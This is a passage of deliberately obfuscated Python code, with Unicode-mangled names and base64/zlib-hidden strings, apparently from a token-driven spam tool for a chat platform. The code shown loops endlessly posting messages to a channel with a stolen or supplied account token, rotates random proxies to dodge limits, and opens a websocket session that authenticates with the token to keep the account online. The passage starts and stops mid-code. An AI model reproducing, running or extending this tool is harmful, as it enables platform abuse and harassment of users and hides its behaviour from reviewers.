    𝘩𝙚𝗮𝗱𝗲𝙧𝘀 = 𝘏𝙚𝘢𝗱𝗲𝗿𝘴(𝘵𝗼𝙠𝗲𝗻)
    while True:
        𝙙𝗻 = 𝙩𝙤𝗸𝘦𝗻.split(__𝗶𝗺𝗽𝙤𝙧𝘵__(𝘭𝙈𝗜𝗜𝗠𝘭𝗠𝙉𝘐𝗜𝗡𝙈𝙡𝙡𝗜𝘔𝙡𝙈𝙡𝗜𝙈𝘐𝗠𝙄𝗡𝙈𝗜𝗹𝘭𝗹𝗡𝗹[𝙧𝘰𝘶𝙣𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝗿𝙩__(𝘭𝘔𝘐𝘐𝗠𝗹𝗠𝙉𝙄𝙄𝘕𝙈𝗹𝗹𝙄𝗠𝘭𝙈𝙡𝗜𝗠𝗜𝘔𝗜𝘕𝗠𝗜𝗹𝗹𝙡𝗡𝗹[𝘳𝘰𝘂𝙣𝙙(𝙖𝘣𝘀(0.3647913186684074 + 0.9310893049671253j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
        𝙣𝘯 = 𝘥𝗻[𝘳𝘰𝙪𝘯𝙙(𝘢𝙗𝘴(0.0 + 0j))]
        𝗱𝗮𝙩𝗮 = {__𝙞𝙢𝘱𝙤𝘳𝙩__(𝗹𝙈𝘐𝘐𝙈𝙡𝙈𝗡𝗜𝙄𝘕𝘔𝙡𝗹𝙄𝙈𝗹𝙈𝙡𝗜𝗠𝙄𝗠𝙄𝘕𝘔𝙄𝙡𝗹𝙡𝙉𝗹[𝗿𝗼𝙪𝙣𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝘳𝘁__(𝗹𝗠𝘐𝙄𝙈𝘭𝘔𝙉𝘐𝙄𝘕𝘔𝘭𝘭𝘐𝘔𝗹𝙈𝘭𝗜𝙈𝘐𝘔𝘐𝙉𝙈𝙄𝗹𝙡𝗹𝗡𝙡[𝙧𝗼𝘂𝗻𝗱(𝙖𝗯𝘴(0.94684724444426 + 0.3216835334429035j))]).decompress(b'x\xda\x8b4\xb2,Mq\x0f+Mq\xb4\xb5\x05\x00\x19\x1d\x03\xcf')).decode(): 𝗺𝙚𝙨𝙨𝗮𝘨𝘦}
        𝘴𝘭𝙚𝙚𝙥(𝗱𝙚𝗹𝗮𝘺)
        if 𝘱𝗿𝘰𝘅𝘺:
            𝘳𝗿 = 𝘳𝗲𝗾𝘶𝙚𝘴𝘵𝘴.post(__𝙞𝗺𝙥𝘰𝘳𝘁__(𝗹𝘔𝗜𝗜𝘔𝙡𝙈𝘕𝙄𝗜𝘕𝘔𝙡𝘭𝙄𝗠𝗹𝘔𝘭𝗜𝗠𝗜𝗠𝙄𝗡𝗠𝙄𝙡𝘭𝙡𝘕𝙡[𝘳𝗼𝙪𝘯𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝘳𝘁__(𝙡𝗠𝗜𝘐𝗠𝘭𝙈𝙉𝘐𝘐𝗡𝙈𝘭𝗹𝗜𝗠𝘭𝘔𝘭𝘐𝙈𝘐𝙈𝙄𝙉𝗠𝘐𝙡𝘭𝘭𝘕𝘭[𝘳𝗼𝙪𝙣𝘥(𝗮𝙗𝙨(0.7362410903123222 + 0.6767193339455605j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b4\xca\xc8H\xca5\xcdI\xf2\xf0-K56(K\n\x0f\xabJ6r\xcb\x8b\x8a\xf0\xb5\x05\x00\xc6\xe7\x16\x0f')).decode().format(𝙘𝙝𝘢𝙣𝘯𝙚𝘭), headers=𝗵𝘦𝘢𝙙𝘦𝘳𝙨, json=𝙙𝗮𝘵𝗮, proxy={__𝘪𝙢𝗽𝙤𝘳𝙩__(𝗹𝙈𝘐𝗜𝗠𝙡𝘔𝙉𝘐𝙄𝘕𝙈𝙡𝘭𝙄𝗠𝙡𝘔𝗹𝗜𝙈𝙄𝗠𝙄𝗡𝙈𝙄𝙡𝙡𝗹𝗡𝗹[𝙧𝙤𝘶𝘯𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝘰𝙧𝙩__(𝘭𝗠𝘐𝗜𝙈𝗹𝗠𝙉𝙄𝙄𝗡𝘔𝗹𝙡𝘐𝙈𝘭𝙈𝗹𝘐𝘔𝙄𝘔𝘐𝙉𝙈𝘐𝙡𝘭𝗹𝘕𝗹[𝘳𝙤𝘶𝗻𝗱(𝘢𝘣𝙨(0.8101230039526488 + 0.5862599410387311j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝘪𝙢𝙥𝗼𝘳𝘁__(𝙡𝘔𝗜𝗜𝗠𝙡𝗠𝗡𝗜𝗜𝙉𝗠𝗹𝘭𝘐𝙈𝙡𝗠𝗹𝗜𝙈𝗜𝙈𝙄𝗡𝗠𝘐𝘭𝙡𝗹𝘕𝗹[𝙧𝙤𝙪𝘯𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__(𝗹𝘔𝗜𝗜𝙈𝘭𝘔𝙉𝘐𝘐𝙉𝘔𝗹𝙡𝘐𝘔𝘭𝘔𝗹𝘐𝗠𝗜𝗠𝙄𝙉𝗠𝘐𝗹𝗹𝙡𝘕𝙡[𝙧𝙤𝘂𝗻𝘥(𝙖𝙗𝙨(0.2511212229260571 + 0.9679556453661096j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝙧𝙖𝙣𝘥𝘰𝙢.choice(𝗽𝙧𝗼𝙭𝗶𝙚𝙨), __𝘪𝗺𝗽𝗼𝗿𝘵__(𝗹𝘔𝘐𝗜𝗠𝗹𝙈𝘕𝗜𝙄𝙉𝙈𝗹𝙡𝙄𝙈𝘭𝙈𝘭𝙄𝙈𝗜𝘔𝗜𝘕𝗠𝗜𝙡𝗹𝗹𝙉𝙡[𝙧𝘰𝘂𝘯𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝙤𝙧𝘵__(𝗹𝙈𝗜𝗜𝙈𝘭𝘔𝘕𝙄𝙄𝙉𝙈𝙡𝙡𝗜𝗠𝙡𝙈𝘭𝗜𝘔𝗜𝙈𝘐𝙉𝙈𝗜𝗹𝘭𝗹𝘕𝗹[𝘳𝘰𝘶𝗻𝙙(𝙖𝘣𝘴(0.18376515094504098 + 0.982970177217064j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝗶𝘮𝘱𝙤𝘳𝘁__(𝙡𝘔𝗜𝗜𝘔𝙡𝘔𝗡𝘐𝙄𝘕𝙈𝗹𝘭𝗜𝘔𝘭𝗠𝘭𝙄𝙈𝗜𝙈𝗜𝘕𝘔𝘐𝙡𝗹𝘭𝙉𝗹[𝙧𝘰𝘂𝘯𝙙(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝙧𝘁__(𝗹𝘔𝗜𝘐𝗠𝗹𝘔𝘕𝙄𝗜𝘕𝗠𝗹𝘭𝙄𝙈𝗹𝘔𝙡𝙄𝙈𝙄𝙈𝗜𝗡𝘔𝗜𝗹𝙡𝙡𝘕𝗹[𝘳𝗼𝘂𝗻𝘥(𝗮𝘣𝙨(0.7169335406003593 + 0.6971415196086322j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝗮𝗻𝗱𝗼𝙢.choice(𝗽𝙧𝘰𝘅𝘪𝙚𝘴)})
        else:
            𝙧𝗿 = 𝙧𝘦𝙦𝙪𝘦𝙨𝘁𝘴.post(__𝗶𝗺𝙥𝗼𝙧𝘵__(𝙡𝘔𝗜𝘐𝗠𝙡𝙈𝗡𝙄𝘐𝙉𝘔𝘭𝗹𝘐𝙈𝙡𝗠𝘭𝗜𝘔𝙄𝗠𝘐𝗡𝙈𝗜𝘭𝗹𝙡𝘕𝗹[𝗿𝗼𝙪𝗻𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝘰𝗿𝘁__(𝘭𝘔𝗜𝘐𝙈𝘭𝗠𝘕𝙄𝗜𝙉𝙈𝙡𝙡𝗜𝘔𝘭𝘔𝘭𝘐𝘔𝘐𝗠𝗜𝘕𝗠𝘐𝗹𝙡𝘭𝗡𝘭[𝙧𝘰𝘂𝘯𝘥(𝘢𝙗𝙨(0.32938028284178456 + 0.9441973465727734j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b4\xca\xc8H\xca5\xcdI\xf2\xf0-K56(K\n\x0f\xabJ6r\xcb\x8b\x8a\xf0\xb5\x05\x00\xc6\xe7\x16\x0f')).decode().format(𝙘𝙝𝗮𝘯𝘯𝗲𝙡), headers=𝗵𝘦𝘢𝗱𝘦𝗿𝘴, json=𝙙𝙖𝘁𝘢)
        if 𝙧𝘳.status_code == 𝗿𝗼𝘂𝘯𝙙(𝙖𝘣𝘴(107.96340224686725 + 168.35647826941837j)):
            𝙥𝘳𝘪𝗻𝙩(__𝗶𝙢𝙥𝘰𝘳𝘵__(𝘭𝙈𝗜𝘐𝘔𝙡𝙈𝗡𝗜𝙄𝗡𝙈𝗹𝙡𝙄𝙈𝗹𝘔𝘭𝙄𝘔𝙄𝙈𝘐𝘕𝙈𝗜𝙡𝙡𝗹𝘕𝗹[𝘳𝙤𝘂𝘯𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__(𝙡𝗠𝗜𝙄𝘔𝙡𝙈𝗡𝗜𝗜𝗡𝗠𝗹𝗹𝗜𝗠𝙡𝘔𝘭𝘐𝙈𝘐𝗠𝗜𝘕𝙈𝙄𝗹𝙡𝙡𝙉𝘭[𝙧𝙤𝘂𝙣𝘥(𝗮𝙗𝘴(0.2089295376844772 + 0.9779306970756929j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\n+M\x01\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xcd\xa6\x0bh')).decode().format(𝗿, 𝙙𝙖𝘵𝙚𝘁𝘪𝘮𝘦.datetime.now().strftime(f"{𝗴}{__𝘪𝙢𝗽𝘰𝗿𝘵__(𝘭𝘔𝙄𝙄𝘔𝗹𝙈𝗡𝙄𝙄𝘕𝗠𝘭𝙡𝗜𝘔𝘭𝙈𝗹𝘐𝙈𝘐𝗠𝘐𝙉𝗠𝙄𝗹𝘭𝘭𝙉𝘭[𝙧𝘰𝘶𝘯𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝘳}"), 𝗿, 𝘭𝙘, 𝙧, 𝘯𝙣, 𝘨))
        elif 𝙧𝗿.status_code == 𝗿𝘰𝘂𝘯𝗱(𝘢𝙗𝘀(301.08555519393883 + 267.8740160104328j)):
            𝘱𝘳𝗶𝘯𝘁(__𝗶𝘮𝘱𝘰𝙧𝘵__(𝙡𝗠𝗜𝙄𝘔𝙡𝗠𝘕𝗜𝙄𝗡𝙈𝘭𝗹𝙄𝙈𝘭𝘔𝙡𝙄𝗠𝗜𝗠𝙄𝙉𝗠𝘐𝗹𝙡𝙡𝘕𝙡[𝙧𝙤𝘂𝗻𝙙(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝘳𝘵__(𝘭𝗠𝘐𝙄𝙈𝙡𝘔𝗡𝙄𝗜𝗡𝗠𝗹𝗹𝗜𝘔𝙡𝘔𝙡𝗜𝙈𝘐𝗠𝘐𝗡𝙈𝘐𝘭𝗹𝘭𝘕𝘭[𝙧𝘰𝘶𝙣𝘥(𝘢𝙗𝘀(0.6284281747956514 + 0.7778676167080143j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\rl\x01\x02\x05\x0c\xb8')).decode().format(𝙧, 𝙙𝘢𝙩𝙚𝘁𝗶𝙢𝘦.datetime.now().strftime(f"{𝗴}{__𝙞𝗺𝘱𝗼𝙧𝘁__(𝙡𝘔𝗜𝗜𝘔𝗹𝙈𝗡𝙄𝙄𝗡𝘔𝙡𝘭𝘐𝘔𝙡𝗠𝙡𝘐𝗠𝘐𝙈𝙄𝙉𝗠𝗜𝘭𝗹𝗹𝘕𝘭[𝘳𝙤𝘂𝙣𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝙧}"), 𝙧, 𝘣, 𝙧, 𝘯𝙣, 𝘨, 𝗿𝘳.text))
            return
        else:
            𝘱𝗿𝙞𝗻𝘵(__𝘪𝘮𝗽𝘰𝘳𝙩__(𝙡𝗠𝘐𝘐𝗠𝗹𝘔𝗡𝙄𝘐𝙉𝘔𝘭𝘭𝗜𝙈𝘭𝘔𝙡𝙄𝙈𝙄𝘔𝘐𝙉𝘔𝗜𝗹𝘭𝗹𝙉𝘭[𝘳𝗼𝘂𝙣𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝘳𝙩__(𝘭𝘔𝙄𝗜𝙈𝘭𝘔𝗡𝗜𝙄𝗡𝗠𝘭𝗹𝘐𝙈𝗹𝙈𝘭𝙄𝙈𝙄𝘔𝘐𝙉𝘔𝗜𝘭𝙡𝘭𝘕𝙡[𝘳𝙤𝘂𝗻𝘥(𝗮𝙗𝙨(0.6539162948651895 + 0.7565669033930723j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\r@\xd8\x16\x008\x81\r\xe7')).decode().format(𝗿, 𝗱𝗮𝘵𝙚𝘁𝙞𝗺𝘦.datetime.now().strftime(f"{𝗴}{__𝗶𝙢𝗽𝗼𝘳𝘵__(𝙡𝗠𝘐𝙄𝘔𝗹𝙈𝙉𝙄𝗜𝘕𝗠𝗹𝗹𝗜𝘔𝗹𝗠𝗹𝙄𝙈𝗜𝙈𝘐𝗡𝙈𝙄𝘭𝗹𝘭𝗡𝗹[𝘳𝘰𝘶𝙣𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝗿}"), 𝗿, 𝙗, 𝗿, 𝙣𝙣, 𝘨, 𝘳𝙧.text, 𝙧𝗿.status_code))

def onliner(token):
    𝙨𝘁𝗮𝘵𝙪𝘀 = [__𝗶𝙢𝙥𝗼𝙧𝘁__(𝙡𝘔𝙄𝗜𝗠𝘭𝗠𝘕𝘐𝘐𝙉𝗠𝗹𝙡𝙄𝙈𝙡𝘔𝗹𝙄𝙈𝘐𝗠𝗜𝙉𝗠𝗜𝘭𝗹𝙡𝗡𝘭[𝘳𝙤𝙪𝗻𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝙤𝗿𝘁__(𝗹𝗠𝗜𝘐𝗠𝗹𝗠𝘕𝗜𝙄𝗡𝙈𝙡𝘭𝙄𝙈𝗹𝙈𝘭𝗜𝙈𝙄𝗠𝗜𝗡𝗠𝗜𝗹𝗹𝗹𝘕𝗹[𝙧𝗼𝙪𝘯𝘥(𝘢𝙗𝘴(0.5246774450051302 + 0.8513011093043921j))]).decompress(b'x\xdaK22-N\x0c7\xcd\x01\x00\x0bR\x02\x96')).decode(), __𝙞𝗺𝗽𝙤𝘳𝘁__(𝗹𝘔𝙄𝘐𝗠𝙡𝙈𝗡𝗜𝗜𝘕𝙈𝙡𝙡𝗜𝙈𝗹𝗠𝘭𝘐𝙈𝙄𝗠𝙄𝘕𝗠𝗜𝙡𝘭𝗹𝘕𝗹[𝗿𝗼𝘂𝘯𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝘳𝙩__(𝘭𝘔𝗜𝙄𝘔𝙡𝙈𝘕𝙄𝗜𝘕𝗠𝙡𝘭𝗜𝙈𝗹𝙈𝙡𝗜𝘔𝗜𝙈𝘐𝘕𝗠𝙄𝗹𝙡𝙡𝘕𝙡[𝙧𝙤𝙪𝗻𝘥(𝗮𝘣𝙨(0.45294183038183433 + 0.8915400710514102j))]).decompress(b'x\xdaK\x0c\x0f*\x8e\n\xb4\xb5\x05\x00\x0c\xae\x02\xa3')).decode(), __𝘪𝘮𝘱𝗼𝘳𝘵__(𝗹𝘔𝗜𝙄𝙈𝗹𝘔𝘕𝙄𝗜𝙉𝙈𝘭𝗹𝙄𝘔𝗹𝘔𝗹𝗜𝙈𝘐𝗠𝙄𝙉𝙈𝘐𝙡𝗹𝘭𝘕𝘭[𝘳𝙤𝙪𝗻𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝗼𝙧𝘵__(𝗹𝗠𝘐𝘐𝘔𝘭𝗠𝙉𝘐𝘐𝗡𝘔𝘭𝙡𝘐𝙈𝗹𝘔𝙡𝘐𝗠𝗜𝙈𝘐𝗡𝘔𝗜𝙡𝙡𝙡𝙉𝗹[𝘳𝘰𝘶𝘯𝘥(𝘢𝗯𝘀(0.4610029944857913 + 0.8873985795994568j))]).decompress(b'x\xda\x8br7\xcd\x06\x00\x03\x16\x01B')).decode()]
    𝘄𝘴 = 𝘸𝙚𝘣𝙨𝘰𝙘𝙠𝘦𝘵.WebSocket()
    𝘄𝘴.connect(__𝗶𝘮𝘱𝘰𝗿𝘵__(𝘭𝙈𝙄𝗜𝘔𝘭𝙈𝗡𝗜𝙄𝘕𝙈𝗹𝗹𝗜𝗠𝙡𝗠𝙡𝗜𝘔𝙄𝙈𝘐𝗡𝗠𝗜𝗹𝘭𝗹𝗡𝙡[𝘳𝗼𝘶𝗻𝙙(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝗼𝘳𝘵__(𝙡𝗠𝗜𝘐𝗠𝙡𝙈𝙉𝘐𝗜𝘕𝗠𝘭𝙡𝙄𝘔𝗹𝗠𝗹𝗜𝗠𝗜𝘔𝘐𝙉𝙈𝘐𝘭𝗹𝙡𝘕𝗹[𝗿𝙤𝘶𝗻𝗱(𝘢𝘣𝘀(0.5519311652365604 + 0.833889674261897j))]).decompress(b'x\xdaK1\xf6\xab\xf2\xcf\xb4(\x8b2r3\x88\x8aH\xc9H\r6\xcdN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9M\xc9\xf3\xa9\xb24\n\x08\x89\xcc\x8d\n7\x05\x8b%\x86\x9b\xe6\x05\x84\x17T%\x19\x99\xd8\x02\x00e\xe6\x14\n')).decode())
    𝗿𝗿 = 𝘸𝘴.recv()
    𝘦𝙫𝗲𝘯𝘁 = 𝙟𝘀𝗼𝙣.loads(𝙧𝘳)
    𝙝𝗲𝗮𝙧𝘵𝗯𝙚𝗮𝘵_𝗶𝘯𝘵𝘦𝘳𝘃𝘢𝗹 = 𝗲𝘷𝗲𝗻𝘁[__𝘪𝙢𝗽𝙤𝗿𝙩__(𝗹𝙈𝘐𝘐𝘔𝗹𝗠𝙉𝙄𝗜𝙉𝘔𝗹𝗹𝗜𝙈𝙡𝘔𝗹𝙄𝙈𝗜𝘔𝗜𝘕𝗠𝙄𝗹𝗹𝗹𝙉𝘭[𝘳𝗼𝘶𝙣𝗱(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝗿𝘵__(𝗹𝙈𝘐𝗜𝙈𝙡𝘔𝗡𝙄𝘐𝗡𝘔𝙡𝘭𝙄𝗠𝘭𝗠𝘭𝗜𝗠𝙄𝙈𝙄𝙉𝙈𝙄𝙡𝘭𝙡𝗡𝘭[𝙧𝗼𝘶𝘯𝙙(𝗮𝘣𝘀(0.700559377323723 + 0.7135941135153776j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode()][__𝙞𝘮𝗽𝙤𝗿𝘁__(𝘭𝙈𝘐𝗜𝘔𝘭𝘔𝙉𝗜𝙄𝙉𝗠𝗹𝗹𝙄𝘔𝗹𝗠𝙡𝘐𝗠𝙄𝙈𝘐𝗡𝗠𝗜𝘭𝙡𝘭𝗡𝙡[𝗿𝘰𝘂𝗻𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝙧𝙩__(𝙡𝙈𝗜𝙄𝘔𝗹𝙈𝙉𝗜𝙄𝙉𝘔𝗹𝗹𝗜𝗠𝘭𝘔𝗹𝙄𝗠𝘐𝗠𝗜𝗡𝙈𝘐𝗹𝘭𝙡𝗡𝗹[𝗿𝘰𝙪𝙣𝙙(𝙖𝙗𝘀(0.18021978135694328 + 0.9836263672795964j))]).decompress(b'x\xdaKt\x0f\xcbH\xce\x0b\xca\x8c\nw3\x880\xca)Mq\x0f\xabL\xc9u+\x06\x00i\x00\x08\x89')).decode()] / 𝗿𝘰𝙪𝗻𝙙(𝙖𝘣𝘀(462.5301864256471 + 886.6035340810773j))
    𝘢𝙪𝙩𝙝 = {__𝙞𝗺𝘱𝘰𝗿𝘵__(𝙡𝗠𝙄𝙄𝘔𝗹𝘔𝗡𝗜𝗜𝗡𝗠𝘭𝘭𝗜𝙈𝗹𝗠𝘭𝗜𝘔𝗜𝙈𝗜𝗡𝙈𝘐𝙡𝗹𝘭𝗡𝘭[𝘳𝘰𝙪𝙣𝘥(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝗼𝗿𝘵__(𝘭𝗠𝙄𝘐𝗠𝙡𝗠𝘕𝙄𝙄𝘕𝙈𝙡𝙡𝘐𝗠𝙡𝙈𝙡𝘐𝙈𝘐𝗠𝗜𝗡𝘔𝗜𝘭𝙡𝙡𝗡𝙡[𝗿𝘰𝙪𝙣𝘥(𝘢𝙗𝘴(0.794703690805292 + 0.6069975649213487j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode(): 𝙧𝘰𝙪𝘯𝗱(𝗮𝗯𝙨(0.8737390979452162 + 1.7990497460386914j)), __𝙞𝙢𝗽𝙤𝙧𝘵__(𝗹𝘔𝘐𝗜𝗠𝘭𝘔𝘕𝗜𝗜𝘕𝘔𝙡𝘭𝗜𝗠𝘭𝗠𝙡𝗜𝗠𝙄𝙈𝙄𝙉𝘔𝗜𝘭𝗹𝙡𝙉𝗹[𝗿𝘰𝘶𝘯𝘥(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝘳𝘁__(𝗹𝙈𝙄𝘐𝗠𝙡𝘔𝗡𝗜𝙄𝘕𝗠𝗹𝘭𝙄𝘔𝗹𝘔𝗹𝙄𝘔𝘐𝙈𝗜𝘕𝙈𝙄𝗹𝘭𝘭𝗡𝘭[𝘳𝙤𝘂𝘯𝗱(𝘢𝙗𝘀(0.6784292280847349 + 0.7346657624255746j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode(): {__𝘪𝙢𝙥𝘰𝘳𝘁__(𝘭𝙈𝙄𝙄𝘔𝘭𝘔𝙉𝘐𝙄𝘕𝗠𝗹𝗹𝘐𝙈𝗹𝘔𝙡𝗜𝗠𝘐𝙈𝘐𝙉𝙈𝘐𝗹𝙡𝘭𝙉𝙡[𝗿𝘰𝘂𝗻𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝘳𝘵__(𝙡𝘔𝗜𝗜𝗠𝘭𝙈𝗡𝘐𝙄𝘕𝘔𝘭𝗹𝘐𝘔𝙡𝗠𝙡𝙄𝙈𝗜𝘔𝘐𝗡𝘔𝗜𝙡𝘭𝙡𝙉𝗹[𝙧𝙤𝘶𝘯𝙙(𝙖𝙗𝘀(0.6086832857956433 + 0.7934132955736368j))]).decompress(b'x\xdaKq\xb7,\x8a\n7\xb1\x05\x00\x0b\xbb\x02y')).decode(): 𝘵𝘰𝘬𝗲𝙣, __𝙞𝘮𝗽𝙤𝙧𝘵__(𝗹𝙈𝘐𝙄𝘔𝘭𝗠𝙉𝘐𝙄𝗡𝘔𝘭𝗹𝙄𝙈𝗹𝘔𝙡𝘐𝗠𝘐𝗠𝗜𝘕𝙈𝙄𝘭𝙡𝙡𝘕𝗹[𝙧𝘰𝙪𝙣𝙙(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝙧𝘁__(𝙡𝘔𝙄𝙄𝙈𝙡𝗠𝗡𝗜𝗜𝘕𝙈𝘭𝗹𝗜𝘔𝙡𝗠𝙡𝗜𝙈𝘐𝙈𝙄𝘕𝗠𝘐𝗹𝘭𝗹𝘕𝘭[𝗿𝙤𝙪𝗻𝗱(𝗮𝙗𝘴(0.11491807252635933 + 0.9933749728107842j))]).decompress(b'x\xda\x8b4r+\x8f\x0c\xf7*Hr\xcf1H\x0c\x0f\xab\x02\x00-R\x05\x80')).decode(): 𝗿𝗼𝘶𝘯𝘥(𝘢𝙗𝙨(4.256068166172039 + 60.85134249763843j)), __𝗶𝙢𝘱𝘰𝙧𝘁__(𝗹𝙈𝙄𝙄𝘔𝙡𝙈𝘕𝙄𝙄𝙉𝗠𝗹𝙡𝙄𝗠𝗹𝗠𝙡𝘐𝘔𝗜𝙈𝘐𝗡𝗠𝘐𝗹𝗹𝙡𝙉𝘭[𝘳𝗼𝘶𝗻𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝘳𝘁__(𝙡𝘔𝘐𝙄𝙈𝘭𝗠𝗡𝘐𝙄𝙉𝘔𝗹𝘭𝘐𝙈𝗹𝙈𝙡𝙄𝙈𝘐𝗠𝗜𝙉𝗠𝗜𝘭𝘭𝗹𝘕𝙡[𝙧𝗼𝙪𝙣𝗱(𝙖𝙗𝙨(0.510908918528276 + 0.8596348509502552j))]).decompress(b'x\xdaK\xf6\xf0*Kv\x0f\xabLq\xcf\xc9I.\xb7\xb5\x05\x001-\x05\xbc')).decode(): {__𝘪𝘮𝘱𝙤𝘳𝘵__(𝘭𝘔𝙄𝙄𝘔𝗹𝘔𝙉𝙄𝗜𝘕𝗠𝘭𝘭𝗜𝘔𝙡𝙈𝙡𝘐𝗠𝗜𝗠𝗜𝗡𝙈𝗜𝘭𝘭𝘭𝘕𝙡[𝘳𝘰𝘂𝘯𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__(𝘭𝘔𝙄𝗜𝙈𝙡𝘔𝘕𝗜𝙄𝙉𝗠𝙡𝘭𝗜𝙈𝙡𝘔𝙡𝘐𝗠𝗜𝗠𝘐𝘕𝗠𝗜𝘭𝗹𝗹𝙉𝙡[𝗿𝙤𝙪𝘯𝗱(𝙖𝙗𝙨(0.7607480071115856 + 0.6490473554955377j))]).decompress(b'x\xdaK2\xf6\xb5\x05\x00\x02\xfc\x01 ')).decode(): __𝘪𝙢𝗽𝘰𝘳𝘵__(𝘭𝙈𝙄𝗜𝗠𝗹𝗠𝘕𝙄𝙄𝗡𝘔𝘭𝘭𝘐𝙈𝙡𝙈𝗹𝙄𝗠𝙄𝘔𝙄𝙉𝘔𝙄𝘭𝙡𝘭𝗡𝗹[𝘳𝗼𝘂𝙣𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝘰𝙧𝘁__(𝗹𝗠𝗜𝙄𝗠𝘭𝙈𝗡𝗜𝗜𝘕𝗠𝙡𝗹𝙄𝙈𝗹𝗠𝗹𝗜𝘔𝗜𝘔𝘐𝘕𝘔𝗜𝙡𝙡𝘭𝘕𝙡[𝗿𝗼𝘶𝙣𝘥(𝙖𝘣𝙨(0.011528700045550067 + 0.9999335423293189j))]).decompress(b'x\xda\x0b3\xca)\x8dr\xb74N.\xb7\xb5\x05\x00\x19M\x03\xcb')).decode(), __𝗶𝘮𝘱𝘰𝘳𝙩__(𝗹𝙈𝙄𝘐𝗠𝗹𝗠𝙉𝙄𝙄𝗡𝙈𝗹𝙡𝙄𝘔𝙡𝙈𝘭𝗜𝙈𝗜𝘔𝗜𝘕𝗠𝗜𝗹𝙡𝙡𝘕𝙡[𝗿𝗼𝙪𝙣𝗱(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝘳𝘵__(𝗹𝗠𝗜𝗜𝙈𝘭𝘔𝘕𝙄𝗜𝗡𝗠𝗹𝘭𝘐𝘔𝘭𝘔𝘭𝙄𝗠𝘐𝙈𝘐𝗡𝙈𝗜𝗹𝘭𝘭𝘕𝘭[𝘳𝙤𝙪𝙣𝗱(𝗮𝙗𝘀(0.5599324389572196 + 0.8285382693656459j))]).decompress(b'x\xda\x8b\xcc\xf3*K1\xf6\xcbIN\xb7\xb5\x05\x00\x1b\xe9\x04\x1d')).decode(): 